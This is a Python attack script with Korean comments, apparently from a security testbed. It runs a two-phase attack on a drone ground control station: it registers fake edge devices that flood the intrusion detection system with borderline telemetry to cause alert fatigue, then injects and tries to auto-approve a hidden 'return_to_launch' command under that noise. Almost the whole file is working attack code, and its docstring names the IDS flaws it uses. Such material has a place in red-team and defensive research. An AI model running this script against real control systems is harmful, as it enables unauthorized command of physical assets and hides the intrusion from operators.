"""
IDS Alert Fatigue + Masked Command Injection 복합 공격
독창 시나리오 | USENIX Security 2024 "Alarm Fatigue in Cyber-Physical IDS" 계열

2단계 복합 공격:

  Phase 1 (경보 포화): 복수의 위장 엣지에서 IDS 경계 임계값 직하의
    이상 신호를 지속적으로 쏟아내 대시보드 침입 탐지 경보 목록을 포화시킨다.
    - track_confidence: 0.58~0.62 (IDS 임계 0.6 바로 아래/위를 오르내림)
    - link_quality:     0.28~0.32 (IDS 임계 0.3 근처)
    → 운용자가 "또 경보야..." 하고 무시하는 Alert Fatigue 유발

  Phase 2 (은폐 공격): 경보 포화 상태에서 실제 커맨드 인젝션을 주입.
    주입 경보가 Phase 1 노이즈에 묻혀 탐지되지 않거나 무시됨.

IDS 취약점 근거 (app.js _idsRaiseAlerts):
    중복 방지 window가 10초 → 10초마다 새 경보 삽입 가능
    intrusionAlerts 최대 50개 → 50개 채우면 이전 경보 밀려남
"""
from __future__ import annotations

import argparse
import random
import time
from .common import GcsClient, wait_for_gcs

# Phase 1: 노이즈 엣지 — IDS 경계값 근처를 오르내리는 애매한 이상 신호
NOISE_EDGES = [
    ("edge-noise-01", "recon-alpha-01"),
    ("edge-noise-02", "recon-bravo-02"),
    ("edge-noise-03", "scout-charlie-03"),
    ("edge-noise-04", "patrol-delta-04"),
    ("edge-noise-05", "monitor-echo-05"),
]


def _borderline_confidence() -> float:
    """IDS 임계(0.6) 바로 아래위를 불규칙하게 오르내림 → 산발적 warning 경보"""
    base = 0.60 + random.gauss(0, 0.04)
    return round(max(0.50, min(0.72, base)), 3)


def _borderline_link_quality() -> float:
    """IDS 임계(0.3) 근처 노이즈"""
    base = 0.30 + random.gauss(0, 0.03)
    return round(max(0.20, min(0.42, base)), 3)


def _register_noise_edges(client: GcsClient) -> None:
    for edge_id, asset_id in NOISE_EDGES:
        try:
            client.post("/api/edge/devices/register", {
                "edge_id":         edge_id,
                "device_type":     "uav_edge",
                "asset_ids":       [asset_id],
                "authority":       "EXTERNAL-ATTACKER",
                "link_profiles":   ["rf_noisy"],
                "capabilities":    ["telemetry_ingest"],
                "software_version": "noise-0.1",
            })
        except Exception:
            pass  # 이미 등록된 경우 무시


def _emit_noise(client: GcsClient, tick: int) -> int:
    """Phase 1: 경계 임계값 근처 이상 신호 배치 전송"""
    ok = 0
    for i, (edge_id, asset_id) in enumerate(NOISE_EDGES):
        conf = _borderline_confidence()
        lq = _borderline_link_quality()
        try:
            # 텔레메트리: track_confidence와 link_quality만 애매하게 조작
            client.post("/api/telemetry/ingest", {
                "asset_id":         asset_id,
                "time_s":           tick,
                "position":         [150 + i * 20 + random.gauss(0, 2),
                                     -200 + i * 15 + random.gauss(0, 2),
                                     80 + random.gauss(0, 1)],
                "velocity_mps":     [random.gauss(10, 1), random.gauss(0, 0.5), 0],
                "heading_deg":      (tick * 7 + i * 40) % 360,
                "status":           "edge-live",
                "source":           "ALERT-NOISE",
                "source_id":        edge_id,
                "source_type":      "uav_edge",
                "source_authority": "EXTERNAL-ATTACKER",
                "track_confidence": conf,   # ← IDS 임계 오르내림
                "link_quality":     lq,     # ← IDS 임계 오르내림
                "link_profile":     "rf_noisy",
            })
            ok += 1
        except Exception:
            pass
    return ok


def _masked_cmd_inject(client: GcsClient, target_asset: str, tick: int) -> bool:
    """Phase 2: 경보 포화 상태에서 실제 커맨드 인젝션"""
    try:
        result = client.post("/api/commands/request", {
            "asset_id":     target_asset,
            "command_type": "return_to_launch",
            "requested_by": "ATTACKER:masked_under_alert_fatigue",
            "dry_run":      True,
            "meta": {
                "attack_scenario": "alert_fatigue_masked_inject",
                "noise_tick":      tick,
                "phase":           2,
            },
        })
        cmd_id = result.get("payload", {}).get("command_id")
        if cmd_id:
            # 즉시 승인 시도 (노이즈 경보에 묻혀 탐지 안 될 가능성)
            try:
                client.post("/api/commands/approve", {"command_id": cmd_id})
                print(f"[alert_fatigue] ★ 은폐 커맨드 승인 성공: {cmd_id}", flush=True)
                return True
            except Exception as e:
                print(f"[alert_fatigue] 은폐 커맨드 주입됨 (승인 차단): {cmd_id} — {e}", flush=True)
                return True
    except Exception as e:
        print(f"[alert_fatigue] 은폐 커맨드 실패: {e}", flush=True)
    return False


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Alert Fatigue + Masked Injection 복합 공격")
    parser.add_argument("--service-url",    default="http://dah-gcs:8080")
    parser.add_argument("--target-asset",   default="small-dronebot-01",
                        help="Phase 2 커맨드 인젝션 대상 자산")
    parser.add_argument("--phase1-duration",type=float, default=45.0,
                        help="Phase 1 (경보 포화) 지속 시간 (s)")
    parser.add_argument("--interval-s",     type=float, default=1.5)
    parser.add_argument("--inject-every",   type=int, default=5,
                        help="Phase 2 커맨드 주입 주기 (틱)")
    args = parser.parse_args(argv)

    client = GcsClient(args.service_url)
    wait_for_gcs(client)

    _register_noise_edges(client)
    print(
        f"[alert_fatigue] 공격 시작\n"
        f"  Phase 1: {args.phase1_duration}s 동안 경보 포화\n"
        f"  Phase 2: 매 {args.inject_every}틱마다 은폐 커맨드 주입",
        flush=True,
    )

    start = time.time()
    tick = 0
    total_noise = 0
    total_inject = 0
    phase = 1

    while True:
        elapsed = time.time() - start
        if elapsed >= args.phase1_duration + 60:  # Phase 2 최대 60s
            break

        # Phase 전환
        if phase == 1 and elapsed >= args.phase1_duration:
            phase = 2
            print(
                f"\n[alert_fatigue] ═══ Phase 2 시작 ═══ "
                f"경보 포화 후 은폐 커맨드 주입 개시 ═══\n",
                flush=True,
            )

        # Phase 1+2 모두: 노이즈 지속 전송 (포화 유지)
        ok = _emit_noise(client, tick)
        total_noise += ok

        # Phase 2: 주기적 은폐 커맨드 인젝션
        if phase == 2 and tick % args.inject_every == 0:
            if _masked_cmd_inject(client, args.target_asset, tick):
                total_inject += 1

        print(
            f"[alert_fatigue] Phase={phase} | tick={tick:04d} | "
            f"노이즈={total_noise} | 은폐주입={total_inject} | {elapsed:.0f}s",
            flush=True,
        )
        tick += 1
        time.sleep(args.interval_s)

    print(
        f"[alert_fatigue] 공격 종료 — 총 노이즈 신호 {total_noise}건, "
        f"은폐 커맨드 {total_inject}건 주입",
        flush=True,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
